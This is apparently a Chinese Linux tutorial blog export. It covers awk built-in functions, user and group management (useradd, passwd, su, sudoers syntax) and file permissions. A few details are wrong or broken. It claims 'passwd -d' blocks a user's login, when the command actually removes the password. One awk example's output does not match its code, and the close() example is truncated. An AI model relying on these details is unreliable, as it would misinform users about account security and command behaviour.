<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print index(info,&quot;11111&quot;)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;</span></span><br><span class="line">no found</span><br><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print index(info,&quot;is&quot;)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;</span></span><br><span class="line">ok</span><br><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print index(info,&quot;test&quot;)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;</span></span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
<p><strong>3、正则表达式匹配查找(match 使用）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print match(info,/[0-9]+/)?&quot;ok&quot;:&quot;no found&quot;;&#125;&#x27;</span></span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
<p><strong>4、截取字符串(substr使用）</strong></p>
<p>从第 4 个 字符开始，截取 10 个长度字符串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;print substr(info,4,10);&#125;&#x27;</span></span><br><span class="line">s is a tes</span><br></pre></td></tr></table></figure>
<p><strong>5、字符串分割（split使用）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test&quot;;split(info,tA,&quot; &quot;);print length(tA);for(k in tA)&#123;print k,tA[k];&#125;&#125;&#x27;</span></span><br><span class="line">4</span><br><span class="line">2 is</span><br><span class="line">3 a</span><br><span class="line">4 <span class="built_in">test</span></span><br><span class="line">1 this</span><br></pre></td></tr></table></figure>
<p>分割 info，将 info 字符串使用空格切分为动态数组 tA。注意 awk for …in 循环，是一个无序的循环。 并不是从数组下标 1…n ，因此使用时候需要特别注意。</p>
<h5 id="时间函数">时间函数</h5>
<table>
<thead>
<tr>
<th><strong>函数名</strong></th>
<th><strong>说明</strong></th>
<th><strong>实例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>mktime( YYYY MM DD HH MM SS[ DST])</td>
<td>生成时间格式</td>
<td><code>$ awk 'BEGIN &#123; print &quot;Number of seconds since the Epoch = &quot; mktime(&quot;2014 12 14 30 20 10&quot;) &#125;'</code>输出结果为：<code>Number of seconds since the Epoch = 1418604610</code></td>
</tr>
<tr>
<td>strftime([format [, timestamp]])</td>
<td>格式化时间输出，将时间戳转为时间字符串 具体格式，见下表.</td>
<td><code>$ awk 'BEGIN &#123; print strftime(&quot;Time = %m/%d/%Y %H:%M:%S&quot;, systime()) &#125;'</code>输出结果为：<code>Time = 12/14/2014 22:08:42</code></td>
</tr>
<tr>
<td>systime()</td>
<td>得到时间戳,返回从1970年1月1日开始到当前时间(不计闰年)的整秒数</td>
<td><code>awk 'BEGIN&#123;now=systime();print now&#125;'</code>输出结果为：<code>1343210982</code></td>
</tr>
</tbody>
</table>
<p>strftime 日期和时间格式说明符:</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>%a</td>
<td>星期缩写(Mon-Sun)。</td>
</tr>
<tr>
<td>%A</td>
<td>星期全称（Monday-Sunday）。</td>
</tr>
<tr>
<td>%b</td>
<td>月份缩写（Jan）。</td>
</tr>
<tr>
<td>%B</td>
<td>月份全称（January）。</td>
</tr>
<tr>
<td>%c</td>
<td>本地日期与时间。</td>
</tr>
<tr>
<td>%C</td>
<td>年份中的世纪部分，其值为年份整除100。</td>
</tr>
<tr>
<td>%d</td>
<td>十进制日期(01-31)</td>
</tr>
<tr>
<td>%D</td>
<td>等价于 %m/%d/%y.</td>
</tr>
<tr>
<td>%e</td>
<td>日期，如果只有一位数字则用空格补齐</td>
</tr>
<tr>
<td>%F</td>
<td>等价于 %Y-%m-%d，这也是 ISO 8601 标准日期格式。</td>
</tr>
<tr>
<td>%g</td>
<td>ISO8610 标准周所在的年份模除 100（00-99)。比如，1993 年 1 月 1 日属于 1992 年的第 53 周。所以，虽然它是 1993 年第 1 天，但是其　ISO8601 标准周所在年份却是 1992。同样，尽管 1973 年 12 月 31 日属于 1973 年但是它却属于  1994 年的第一周。所以 1973 年 12 月 31 日的 ISO8610　标准周所在的年是 1974 而不是 1973。</td>
</tr>
<tr>
<td>%G</td>
<td>ISO 标准周所在年份的全称。</td>
</tr>
<tr>
<td>%h</td>
<td>等价于 %b.</td>
</tr>
<tr>
<td>%H</td>
<td>用十进制表示的 24 小时格式的小时(00-23)</td>
</tr>
<tr>
<td>%I</td>
<td>用十进制表示的 12 小时格式的小时（00-12）</td>
</tr>
<tr>
<td>%j</td>
<td>一年中的第几天（001-366）</td>
</tr>
<tr>
<td>%m</td>
<td>月份（01-12）</td>
</tr>
<tr>
<td>%M</td>
<td>分钟数（00-59)</td>
</tr>
<tr>
<td>%n</td>
<td>换行符 (ASCII LF)</td>
</tr>
<tr>
<td>%p</td>
<td>十二进制表示法（AM/PM）</td>
</tr>
<tr>
<td>%r</td>
<td>十二进制表示法的时间（等价于 %I:%M:%S %p）。</td>
</tr>
<tr>
<td>%R</td>
<td>等价于 %H:%M。</td>
</tr>
<tr>
<td>%S</td>
<td>时间的秒数值（00-60）</td>
</tr>
<tr>
<td>%t</td>
<td>制表符 (tab)</td>
</tr>
<tr>
<td>%T</td>
<td>等价于 %H:%M:%S。</td>
</tr>
<tr>
<td>%u</td>
<td>以数字表示的星期(1-7),1 表示星期一。</td>
</tr>
<tr>
<td>%U</td>
<td>一年中的第几个星期（第一个星期天作为第一周的开始），00-53</td>
</tr>
<tr>
<td>%V</td>
<td>一年中的第几个星期（第一个星期一作为第一周的开始），01-53。</td>
</tr>
<tr>
<td>%w</td>
<td>以数字表示的星期（0-6），0表示星期日 。</td>
</tr>
<tr>
<td>%W</td>
<td>十进制表示的一年中的第几个星期（第一个星期一作为第一周的开始），00-53。</td>
</tr>
<tr>
<td>%x</td>
<td>本地日期表示</td>
</tr>
<tr>
<td>%X</td>
<td>本地时间表示</td>
</tr>
<tr>
<td>%y</td>
<td>年份模除 100。</td>
</tr>
<tr>
<td>%Y</td>
<td>十进制表示的完整年份。</td>
</tr>
<tr>
<td>%z</td>
<td>时区，表示格式为+HHMM（例如，格式要求生成的 RFC 822或者 RFC 1036 时间头）</td>
</tr>
<tr>
<td>%Z</td>
<td>时区名称或缩写，如果时区待定则无输出。</td>
</tr>
</tbody>
</table>
<h5 id="位操作函数">位操作函数</h5>
<table>
<thead>
<tr>
<th><strong>函数名</strong></th>
<th><strong>说明</strong></th>
<th><strong>实例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>and</td>
<td>位与操作。</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 num2 = 6 printf &quot;(%d AND %d) = %d\n&quot;, num1, num2, and(num1, num2) &#125;'</code>输出结果为：<code>(10 AND 6) = 2</code></td>
</tr>
<tr>
<td>compl</td>
<td>按位求补。</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 printf &quot;compl(%d) = %d\n&quot;, num1, compl(num1) &#125;'</code>输出结果为：<code>compl(10) = 9007199254740981</code></td>
</tr>
<tr>
<td>lshift</td>
<td>左移位操作</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 printf &quot;lshift(%d) by 1 = %d\n&quot;, num1, lshift(num1, 1) &#125;'</code>输出结果为：<code>lshift(10) by 1 = 20</code></td>
</tr>
<tr>
<td>rshift</td>
<td>右移位操作</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 printf &quot;rshift(%d) by 1 = %d\n&quot;, num1, rshift(num1, 1) &#125;'</code>输出结果为：<code>rshift(10) by 1 = 5</code></td>
</tr>
<tr>
<td>or</td>
<td>按位或操作</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 num2 = 6 printf &quot;(%d OR %d) = %d\n&quot;, num1, num2, or(num1, num2) &#125;'</code>输出结果为：<code>(10 OR 6) = 14</code></td>
</tr>
<tr>
<td>xor</td>
<td>按位异或操作</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 num2 = 6 printf &quot;(%d XOR %d) = %d\n&quot;, num1, num2, xor(num1, num2) &#125;'</code>输出结果为：<code>(10 bitwise xor 6) = 12</code></td>
</tr>
</tbody>
</table>
<h5 id="其他函数">其他函数</h5>
<table>
<thead>
<tr>
<th><strong>函数名</strong></th>
<th><strong>说明</strong></th>
<th><strong>实例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>close(expr)</td>
<td>关闭管道的文件</td>
<td>`$ awk 'BEGIN { cmd = “tr [a-z] [A-Z]” print “hello, world !!!”</td>
</tr>
<tr>
<td>delete</td>
<td>用于从数组中删除元素</td>
<td><code>$ awk 'BEGIN &#123; arr[0] = &quot;One&quot; arr[1] = &quot;Two&quot; arr[2] = &quot;Three&quot; arr[3] =  &quot;Four&quot; print &quot;Array elements before delete operation:&quot; for (i in arr) &#123;  print arr[i] &#125; delete arr[0] delete arr[1] print &quot;Array elements after  delete operation:&quot; for (i in arr) &#123; print arr[i] &#125; &#125;'</code>输出结果为：<code>Array elements before delete operation: One Two Three Four Array elements after delete operation: Three Four</code></td>
</tr>
<tr>
<td>exit</td>
<td>终止脚本执行，它可以接受可选的参数 expr 传递 AWK 返回状态。</td>
<td><code>$ awk 'BEGIN &#123; print &quot;Hello, World !!!&quot; exit 10 print &quot;AWK never executes this statement.&quot; &#125;'</code>输出结果为：<code>Hello, World !!!</code></td>
</tr>
<tr>
<td>flush</td>
<td>刷新打开文件或管道的缓冲区</td>
<td></td>
</tr>
<tr>
<td>getline</td>
<td>读入下一行</td>
<td>使用 getline 从文件 marks.txt 中读入一行并输出：<code>$ awk '&#123;getline; print $0&#125;' marks.txt</code>，AWK 从文件 marks.txt 中读入一行存储到变量 0 中。在下一条语句中，我们使用 getline 读入下一行。因此AWK读入第二行并存储到 0 中。最后，AWK 使用 print 输出第二行的内容。这个过程一直到文件结束。</td>
</tr>
<tr>
<td>next</td>
<td>停止处理当前记录，并且进入到下一条记录的处理过程。</td>
<td>当模式串匹配成功后程序并不执行任何操作：<code>$ awk '&#123;if ($0 ~/Shyam/) next; print $0&#125;' marks.txt</code></td>
</tr>
<tr>
<td>nextfile</td>
<td>停止处理当前文件，从下一个文件第一个记录开始处理。</td>
<td>首先创建两个文件。 file1.txt 内容如下:<code>file1:str1 file1:str2 file1:str3 file1:str4</code>文件 file2.txt 内容如下：<code>file2:str1 file2:str2 file2:str3 file2:str4</code>现在我们来测试 nextfile 函数。<code>$ awk '&#123; if ($0 ~ /file1:str2/) nextfile; print $0 &#125;' file1.txt file2.txt</code>输出结果为：<code>file1:str1 file2:str1 file2:str2 file2:str3 file2:str4</code></td>
</tr>
<tr>
<td>return</td>
<td>从用户自定义的函数中返回值。请注意，如果没有指定返回值，那么的返回值是未定义的。</td>
<td>创建文件 functions.awk，内容如下：<code>function addition(num1, num2) &#123; result = num1 + num2 return result &#125; BEGIN &#123; res = addition(10, 20) print &quot;10 + 20 = &quot; res &#125;</code>执行该文件：<code>$ awk -f functions.awk 10 + 20 = 30</code></td>
</tr>
<tr>
<td>system</td>
<td>执行特定的命令然后返回其退出状态。返回值为 0 表示命令执行成功；非 0 表示命令执行失败。</td>
<td><code>$ awk 'BEGIN &#123; ret = system(&quot;date&quot;); print &quot;Return value = &quot; ret &#125;'</code>输出结果为：<code>Sun Dec 21 23:16:07 IST 2014 Return value = 0</code></td>
</tr>
</tbody>
</table>
<p>本文参考：</p>
<p><a href="https://blog.csdn.net/Jerry00713/article/details/123867016">linux三剑客sed之模式空间与保持空间</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
        <category>Linux</category>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】用户与权限管理</title>
    <url>/posts/2b99b9f0/</url>
    <content><![CDATA[<h2 id="用户管理">用户管理</h2>
<p>用户管理包括用户与组账号的管理。</p>
<p>在Unix/Linux系统中，不论是由本机或是远程登录系统，每个系统都必须拥有一个账号，并且对于不同的系统资源拥有不同的使用权限。</p>
<p>Unix/Linux系统中的root账号通常用于系统的维护和管理，它对Unix/Linux操作系统的所有部分具有不受限制的访问权限。</p>
<p>在Unix/Linux安装的过程中，系统会自动创建许多用户账号，而这些默认的用户就称为“标准用户”。</p>
<p>在大多数版本的Unix/Linux中，都不推荐直接使用root账号登录系统。</p>
<span id="more"></span>
<h3 id="whoami：查看当前用户">whoami：查看当前用户</h3>
<p>查看当前系统当前账号的用户名。可通过cat /etc/passwd查看系统用户信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Corazon@rocky8:~]$ <span class="built_in">whoami</span></span><br><span class="line">Corazon</span><br></pre></td></tr></table></figure>
<h3 id="who：查看登录用户">who：查看登录用户</h3>
<p>who命令用于查看当前所有登录系统的用户信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Corazon@rocky8:~]$ <span class="built_in">who</span></span><br><span class="line">root     tty1         2025-02-19 12:30</span><br><span class="line">root     pts/0        2025-02-19 13:17 (10.0.0.1)</span><br></pre></td></tr></table></figure>
<p>常用选项：</p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-m或am I</td>
<td>只显示运行who命令的用户名、登录终端和登录时间</td>
</tr>
<tr>
<td style="text-align:center">-q或–count</td>
<td>只显示用户的登录账号和登录用户的数量</td>
</tr>
<tr>
<td style="text-align:center">-u</td>
<td>在登录时间后显示该用户最后一次操作到当前的时间间隔</td>
</tr>
<tr>
<td style="text-align:center">–heading</td>
<td>显示列标题</td>
</tr>
<tr>
<td style="text-align:center">-u</td>
<td>显示PID</td>
</tr>
</tbody>
</table>
<h3 id="exit：退出登录账户">exit：退出登录账户</h3>
<p>如果是图形界面，退出当前终端；</p>
<p>如果是使用ssh远程登录，退出登陆账户；</p>
<p>如果是切换后的登陆用户，退出则返回上一个登陆账号。</p>
<h3 id="useradd：添加用户账号">useradd：添加用户账号</h3>
<p>在Unix/Linux中添加用户账号可以使用adduser或useradd命令，因为adduser命令是指向useradd命令的一个链接，因此，这两个命令的使用格式完全一样。</p>
<p>useradd命令的使用格式如下： useradd [参数] 新建用户账号</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td>指定用户登录系统时的主目录</td>
</tr>
<tr>
<td>-m</td>
<td>自动建立目录，未指定-d参数时会在/home/{当前用户}目录下建立主目录</td>
</tr>
<tr>
<td>-g</td>
<td>指定组名称</td>
</tr>
</tbody>
</table>
<p>相关说明：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Linux每个用户都要有一个主目录，主目录就是第一次登陆系统，用户的默认当前目录(/home/用户)；</p>
</li>
<li class="lvl-2">
<p>每一个用户必须有一个主目录，所以用useradd创建用户的时候，一定给用户指定一个主目录；</p>
</li>
<li class="lvl-2">
<p>如果创建用户的时候，不指定组名，那么系统会自动创建一个和用户名一样的组名。</p>
</li>
<li class="lvl-2">
<p>使用user创建账户后需要使用命令<code>passwd 新建用户</code>为新账户设置密码后才能登陆</p>
</li>
</ul>
<p>若创建用户时未指定家目录，后期可通过<code>usermod -d /home/abc abc</code>指定</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>useradd -d /home/abc abc -m</td>
<td>创建abc用户，如果/home/abc目录不存在，就自动创建这个目录，同时用户属于abc组</td>
</tr>
<tr>
<td>useradd -d /home/a a -g test -m</td>
<td>创建一个用户名字叫a，主目录在/home/a，如果主目录不存在，就自动创建主目录，同时用户属于test组</td>
</tr>
<tr>
<td>cat /etc/passwd</td>
<td>查看系统当前用户名</td>
</tr>
</tbody>
</table>
<h3 id="设置用户密码：passwd">设置用户密码：passwd</h3>
<p>超级用户可以为自己和其他用户指定口令，普通用户只能用它修改自己的口令。命令的格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd 选项 用户名</span><br></pre></td></tr></table></figure>
<p>可使用的选项：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-l 锁定口令，即禁用账号。</p>
</li>
<li class="lvl-2">
<p>-u 口令解锁。</p>
</li>
<li class="lvl-2">
<p>-d 使账号无口令。</p>
</li>
<li class="lvl-2">
<p>-f 强迫用户下次登录时修改口令。</p>
</li>
</ul>
<p>普通用户修改自己的口令时，passwd命令会先询问原口令，验证后再要求用户输入两遍新口令，如果两次输入的口令一致，则将这个口令指定给用户；而超级用户为用户指定口令时，就不需要知道原口令。</p>
<p>假设当前用户是sam，则下面的命令修改该用户自己的口令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ passwd </span><br><span class="line">Old password:****** </span><br><span class="line">New password:******* </span><br><span class="line">Re-enter new password:*******</span><br></pre></td></tr></table></figure>
<p>如果是超级用户，可以用下列形式指定任何用户的口令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># passwd sam </span></span><br><span class="line">New password:******* </span><br><span class="line">Re-enter new password:*******</span><br></pre></td></tr></table></figure>
<p>使用root账户为用户指定空口令时，执行下列形式的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd -d sam</span><br></pre></td></tr></table></figure>
<p>此命令将用户 sam 的口令删除，这样用户 sam 下一次登录时，系统就不再允许该用户登录了。</p>
<p>passwd 命令还可以用 -l(lock) 选项锁定某一用户，使其不能登录，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd -l sam</span><br></pre></td></tr></table></figure>
<h3 id="usermod：修改用户">usermod：修改用户</h3>
<p>常用的选项包括<code>-c, -d, -m, -g, -G, -s, -u以及-o等</code>，这些选项的意义与<code>useradd</code>命令中的选项一样，可以为用户指定新的资源值 。</p>
<p>修改用户所在组：usermod -g 用户组 用户名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -g <span class="built_in">test</span> abc</span><br></pre></td></tr></table></figure>
<p>改abc用户的家目录位置：usermod -d 家目录 用户名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -d /home/abc abc</span><br></pre></td></tr></table></figure>
<p>选项<code>-l 新用户名</code>指定一个新的账号，可修改用户名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/txt$ <span class="built_in">tail</span> /etc/passwd -n 1 </span><br><span class="line">aaa:x:1001:1001::/home/aaa:</span><br><span class="line">python@ubuntu:~/txt$ <span class="built_in">sudo</span> usermod -l bbb -d /home/bbb aaa   </span><br><span class="line">python@ubuntu:~/txt$ <span class="built_in">tail</span> /etc/passwd -n 1               </span><br><span class="line">bbb:x:1001:1001::/home/bbb:</span><br></pre></td></tr></table></figure>
<h3 id="删除用户：userdel">删除用户：userdel</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>userdel abc(用户名)</td>
<td>删除abc用户，但不会自动删除用户的主目录</td>
</tr>
<tr>
<td>userdel -r abc(用户名)</td>
<td>删除用户，同时删除用户的主目录</td>
</tr>
</tbody>
</table>
<h3 id="切换用户：su">切换用户：su</h3>
<p>su后面可以加“-”会将当前的工作目录自动转换到切换后的用户主目录.</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>su</td>
<td>切换到root用户</td>
</tr>
<tr>
<td>su root</td>
<td>切换到root用户</td>
</tr>
<tr>
<td>su -</td>
<td>切换到root用户，同时切换目录到/root</td>
</tr>
<tr>
<td>su - root</td>
<td>切换到root用户，同时切换目录到/root</td>
</tr>
<tr>
<td>su 普通用户</td>
<td>切换到普通用户</td>
</tr>
<tr>
<td>su - 普通用户</td>
<td>切换到普通用户，同时切换普通用户所在的目录</td>
</tr>
</tbody>
</table>
<p>注意：对于ubuntu平台，只能通过sudo su进入root账号。</p>
<p>sudo允许系统管理员让普通用户执行一些或者全部的root命令的一个工具。</p>
<h3 id="sudo：以root身份执行指令">sudo：以root身份执行指令</h3>
<p>sudo命令可以临时获取root权限</p>
<p>使用权限：在 /etc/sudoers 中有出现的使用者。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">显示出自己（执行 <span class="built_in">sudo</span> 的使用者）的权限</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">以root权限执行上一条命令</span><br><span class="line"><span class="built_in">sudo</span> !!</span><br></pre></td></tr></table></figure>
<p>sudoers文件配置语法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user  MACHINE=COMMANDS</span><br><span class="line">用户 登录的主机=（可以变换的身份） 可以执行的命令  </span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">允许root用户执行任意路径下的任意命令 </span><br><span class="line">root    ALL=(ALL)       ALL</span><br><span class="line">允许wheel用户组中的用户执行所有命令  </span><br><span class="line">%wheel        ALL=(ALL)       ALL</span><br><span class="line">允许wheel用户组中的用户在不输入该用户的密码的情况下使用所有命令</span><br><span class="line">%wheel        ALL=(ALL)       NOPASSWD: ALL</span><br><span class="line">允许support用户在EPG的机器上不输入密码的情况下使用SQUID中的命令</span><br><span class="line">Cmnd_Alias   SQUID = /opt/vtbin/squid_refresh, /sbin/service, /bin/rm</span><br><span class="line">Host_Alias   EPG = 192.168.1.1, 192.168.1.2</span><br><span class="line">support EPG=(ALL) NOPASSWD: SQUID</span><br></pre></td></tr></table></figure>
<h3 id="添加、删除组账号：groupadd、groupdel">添加、删除组账号：groupadd、groupdel</h3>
<p>groupadd 新建组账号 groupdel 组账号 cat /etc/group 查看用户组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ <span class="built_in">sudo</span> groupadd abc</span><br><span class="line">python@ubuntu:~/test$ <span class="built_in">sudo</span> groupdel abc</span><br></pre></td></tr></table></figure>
<h3 id="用户组管理：groupmod">用户组管理：groupmod</h3>
<p>修改用户组的属性使用groupmod命令。其语法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">groupmod 选项 用户组</span><br></pre></td></tr></table></figure>
<p>常用的选项有：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-g GID 为用户组指定新的组标识号。</p>
</li>
<li class="lvl-2">
<p>-o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。</p>
</li>
<li class="lvl-2">
<p>-n新用户组 将用户组的名字改为新名字</p>
</li>
</ul>
<p>将组group2的组标识号修改为102：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">groupmod -g 102 group2</span><br></pre></td></tr></table></figure>
<p>将组group2的标识号改为10000，组名修改为group3：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">groupmod –g 10000 -n group3 group2</span><br></pre></td></tr></table></figure>
<p>如果一个用户同时属于多个用户组，那么用户可以在用户组之间切换，以便具有其他用户组的权限。</p>
<p>用户可以在登录后，使用命令newgrp切换到其他用户组，这个命令的参数就是目的用户组。例如：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>newgrp root</span><br></pre></td></tr></table></figure>
<p>这条命令将当前用户切换到root用户组，前提条件是root用户组确实是该用户的主组或附加组。类似于用户账号的管理，用户组的管理也可以通过集成的系统管理工具来完成。</p>
<h2 id="权限管理">权限管理</h2>
<h3 id="列出目录的内容：ls">列出目录的内容：ls</h3>
<p>Linux文件或者目录名称最长可以有265个字符，“.”代表当前目录，“…”代表上一级目录，以“.”开头的文件为隐藏文件，需要用 -a 参数才能显示。</p>
<p>ls常用参数：</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-a</td>
<td>显示指定目录下所有子目录与文件，包括隐藏文件</td>
</tr>
<tr>
<td style="text-align:center">-l</td>
<td>以列表方式显示文件的详细信息</td>
</tr>
<tr>
<td style="text-align:center">-h</td>
<td>配合 -l 以人性化的方式显示文件大小</td>
</tr>
</tbody>
</table>
<p><img src="/posts/2b99b9f0//image-20250218170841665.png" alt="image-20250218170841665"></p>
<p>列出的信息的含义：</p>
<p><img src="/posts/2b99b9f0//ccff78bd3a3c92ac11636923216ce3ed.png" alt="img"></p>
<p>ls支持通配符：</p>
<table>
<thead>
<tr>
<th style="text-align:center">通配符</th>
<th style="text-align:left">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">*</td>
<td style="text-align:left">文件代表文件名中所有字符</td>
</tr>
<tr>
<td style="text-align:center">ls te*</td>
<td style="text-align:left">查找以te开头的文件</td>
</tr>
<tr>
<td style="text-align:center">ls *html</td>
<td style="text-align:left">查找结尾为html的文件</td>
</tr>
<tr>
<td style="text-align:center">？</td>
<td style="text-align:left">代表文件名中任意一个字符</td>
</tr>
<tr>
<td style="text-align:center">ls ?.c</td>
<td style="text-align:left">只找第一个字符任意，后缀为.c的文件</td>
</tr>
<tr>
<td style="text-align:center">ls a.?</td>
<td style="text-align:left">只找只有3个字符，前2字符为a.，最后一个字符任意的文件</td>
</tr>
<tr>
<td style="text-align:center">[]</td>
<td style="text-align:left">[”和“]”将字符组括起来，表示可以匹配字符组中的任意一个。“-”用于表示字符范围。</td>
</tr>
<tr>
<td style="text-align:center">[abc]</td>
<td style="text-align:left">匹配a、b、c中的任意一个</td>
</tr>
<tr>
<td style="text-align:center">[a-f]</td>
<td style="text-align:left">匹配从a到f范围内的的任意一个字符</td>
</tr>
<tr>
<td style="text-align:center">ls [a-f]*</td>
<td style="text-align:left">找到从a到f范围内的的任意一个字符开头的文件</td>
</tr>
<tr>
<td style="text-align:center">ls a-f</td>
<td style="text-align:left">查找文件名为a-f的文件,当“-”处于方括号之外失去通配符的作用</td>
</tr>
<tr>
<td style="text-align:center">\</td>
<td style="text-align:left">如果要使通配符作为普通字符使用，可以在其前面加上转义字符。“?”和“*”处于方括号内时不用使用转义字符就失去通配符的作用。</td>
</tr>
<tr>
<td style="text-align:center">ls \*a</td>
<td style="text-align:left">查找文件名为*a的文件</td>
</tr>
</tbody>
</table>
<h3 id="显示inode的内容：stat">显示inode的内容：stat</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stat</span> [文件或目录]</span><br></pre></td></tr></table></figure>
<p>查看 testfile 文件的inode内容内容，可以用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8 ~]# <span class="built_in">stat</span> anaconda-ks.cfg </span><br><span class="line">  File: anaconda-ks.cfg</span><br><span class="line">  Size: 1256      	Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: fd00h/64768d	Inode: 201326724   Links: 1</span><br><span class="line">Access: (0600/-rw-------)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Context: system_u:object_r:admin_home_t:s0</span><br><span class="line">Access: 2025-02-18 21:18:29.137289911 +0800</span><br><span class="line">Modify: 2025-02-18 21:18:29.216289006 +0800</span><br><span class="line">Change: 2025-02-18 21:18:29.216289006 +0800</span><br><span class="line"> Birth: 2025-02-18 21:18:29.137289911 +0800</span><br></pre></td></tr></table></figure>
<h3 id="文件访问权限">文件访问权限</h3>
<p>用户能够控制一个给定的文件或目录的访问程度，一个文件或目录可能有读、写及执行权限：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>读权限（r） ：对于文件，具有读取文件内容的权限；对于目录，具有浏览目录的权限。</p>
</li>
<li class="lvl-2">
<p>写权限（w） ：对于文件，具有修改文件内容的权限；对于目录，具有删除、移动目录内文件的权限。</p>
</li>
<li class="lvl-2">
<p>可执行权限（x）： 对于文件，具有执行文件的权限；对于目录，该用户具有进入目录的权限。</p>
</li>
</ul>
<p>通常，Unix/Linux系统只允许文件的属主(所有者)或超级用户改变文件的读写权限。</p>
<p>示例：</p>
<p><img src="/posts/2b99b9f0//7da5a8288cfb2d26b70da16da71b36e8.png" alt="img"></p>
<p>第1个字母代表文件的类型：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>“d” 代表文件夹</p>
</li>
<li class="lvl-2">
<p>“-” 代表普通文件</p>
</li>
<li class="lvl-2">
<p>“c” 代表硬件字符设备</p>
</li>
<li class="lvl-2">
<p>“b” 代表硬件块设备</p>
</li>
<li class="lvl-2">
<p>“s”表示管道文件</p>
</li>
<li class="lvl-2">
<p>“l” 代表软链接文件。</p>
</li>
</ul>
<p>后9个字母分别代表三组权限：文件所有者、用户组、其他用户拥有的权限。</p>
<h3 id="chmod：修改文件权限">chmod：修改文件权限</h3>
<p>chmod 修改文件权限有两种使用格式：字母法与数字法。</p>
<p>字母法：chmod u/g/o/a +/-/= rwx 文件</p>
<table>
<thead>
<tr>
<th>[ u/g/o/a ]</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>u</td>
<td>user 表示该文件的所有者</td>
</tr>
<tr>
<td>g</td>
<td>group 表示与该文件的所有者属于同一组( group )者，即用户组</td>
</tr>
<tr>
<td>o</td>
<td>other 表示其他以外的人</td>
</tr>
<tr>
<td>a</td>
<td>all 表示这三者皆是</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>[ ±= ]</th>
